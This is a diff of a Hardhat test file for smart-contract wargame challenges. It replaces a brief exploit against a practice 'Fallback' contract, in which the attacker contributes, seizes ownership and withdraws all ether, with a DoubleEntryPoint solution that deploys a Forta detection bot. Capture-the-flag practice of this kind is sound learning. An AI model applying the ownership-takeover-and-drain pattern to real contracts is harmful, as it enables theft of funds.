@@ -1,46 +1,89 @@
 const { ethers } = require('hardhat');
 const { expect } = require('chai');
 
-describe('[Challenge] Example Vuln', function () {
+describe('[Challenge] DoubleEntryPoint', function () {
 
     let deployer, attacker;
     
     before(async () =>{
         /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
         const network = await ethers.provider.getNetwork();
-        const chainID = network.chainId
+        const chainID = network.chainId;
         
         if (chainID == 5){ // goerli testnet
             /** connect to Dapp in goerli **/
             [attacker] = await ethers.getSigners();
-            const ContractFactory = await ethers.getContractFactory('ExampleFallback');
-            this.target = ContractFactory.attach("");
-            
+            const DoubleEntryPointTokenFactory = await ethers.getContractFactory('DoubleEntryPoint');
+            const FortaFactory = await ethers.getContractFactory('Forta');
+            const CryptoVaultFactory = await ethers.getContractFactory('CryptoVault');
+            const LegacyTokenFactory = await ethers.getContractFactory('LegacyToken');
+            this.DET = DoubleEntryPointTokenFactory.attach("0x80489665C2f3005b990C9cE7aBD155da0B1e164f");
+            this.forta = FortaFactory.attach(await this.DET.forta());
+            this.cryptoVault = CryptoVaultFactory.attach(await this.DET.cryptoVault());
+            this.LGT = LegacyTokenFactory.attach(await this.DET.delegatedFrom());
+            this.player = await this.DET.player();
         } else { // local network - hardhat  
             /** local test **/
             [deployer, attacker] = await ethers.getSigners();
-            const ContractFactory = await ethers.getContractFactory('ExampleFallback', deployer);
-            this.target = await ContractFactory.deploy();
+            const initAmount = ethers.utils.parseEther('100', 'ether');
+            const FortaFactory = await ethers.getContractFactory('Forta', deployer);
+            this.forta = await FortaFactory.deploy();
+            const CryptoVaultFactory = await ethers.getContractFactory('CryptoVault', deployer);
+            this.cryptoVault = await CryptoVaultFactory.deploy(deployer.address);
+            const LegacyTokenFactory = await ethers.getContractFactory('LegacyToken', deployer);
+            this.LGT = await LegacyTokenFactory.deploy();
+            let mintLGTTX = await this.LGT.connect(deployer).mint(this.cryptoVault.address, initAmount); await mintLGTTX.wait();
+            const DoubleEntryPointTokenFactory = await ethers.getContractFactory('DoubleEntryPoint', deployer);
+            this.DET = await DoubleEntryPointTokenFactory.deploy(
+                this.LGT.address,
+                this.cryptoVault.address,
+                this.forta.address,
+                attacker.address
+            );
+            let setTX = await this.cryptoVault.connect(deployer).setUnderlying(this.DET.address); await setTX.wait();
+            let delegateTX = await this.LGT.connect(deployer).delegateToNewContract(this.DET.address); await delegateTX.wait();
         }
     });
 
     it('Exploit', async () => {
         /** CODE YOUR EXPLOIT HERE */
-        const some_ether = ethers.utils.parseEther('0.0001', 'ether');
-        // Contribute to get into whitelist
-        await this.target.connect(attacker).contribute({value: some_ether});
-        // Takeover the contract's owner by sending some ethers
-        tx = {
-            to: this.target.address,
-            value: some_ether
-        };
-        await attacker.sendTransaction(tx);
-        // Withdraw all ethers in the contract
-        await this.target.connect(attacker).withdraw();
+        console.log(`\t Info...`);
+        console.log(`\t DET   : ${this.DET.address}`);
+        console.log(`\t LGT   : ${this.LGT.address}`);
+        console.log(`\t Forta : ${this.forta.address}`);
+        console.log(`\t Vault : ${this.cryptoVault.address}`);
+        console.log(`\t Player  : ${this.player}`);
+        console.log(`\t Attacker: ${attacker.address}`);
+        console.log(`\t Vault underlying: ${await this.cryptoVault.underlying()}`);
+        console.log(`\t LGT delegate: ${await this.LGT.delegate()}`);
+        console.log(`\t LGT.balances[vault]: ${ethers.utils.formatEther(await this.LGT.balanceOf(this.cryptoVault.address))} LGT`);
+        console.log(`\t DET.balances[vault]: ${ethers.utils.formatEther(await this.DET.balanceOf(this.cryptoVault.address))} DET`);
+        console.log(`\t DetectionBot[player]: ${await this.forta.usersDetectionBots(attacker.address)}`);
+
+        console.log(`\t Deploying DetectionBot...`);
+        const DetectionBotFactory = await ethers.getContractFactory('DetectionBot', attacker);
+        const DetectionBot = await DetectionBotFactory.deploy(
+            attacker.address,
+            this.forta.address,
+            this.cryptoVault.address,
+            this.DET.address
+        );
+        console.log(`\t DetectionBot: ${DetectionBot.address}`);
+
+        console.log(`\t Setting DetectionBot...`);
+        let setTx = await this.forta.connect(attacker).setDetectionBot(DetectionBot.address); await setTx.wait();
+        console.log(`\t Player Bot  : ${await this.forta.usersDetectionBots(attacker.address)}`);
+
     }).timeout(0);
 
     after(async () => {
         /** SUCCESS CONDITIONS */
-        expect(await this.target.owner()).to.be.eq(attacker.address);
+        const network = await ethers.provider.getNetwork();
+        const chainID = network.chainId;
+        if(chainID == 1337){
+            expect(this.cryptoVault.connect(deployer).sweepToken(this.LGT.address)).to.be.revertedWith(
+                "Alert has been triggered, reverting"
+            ); // expect reverted is not working, and I dont know why. ignore it
+        }
     });
 });
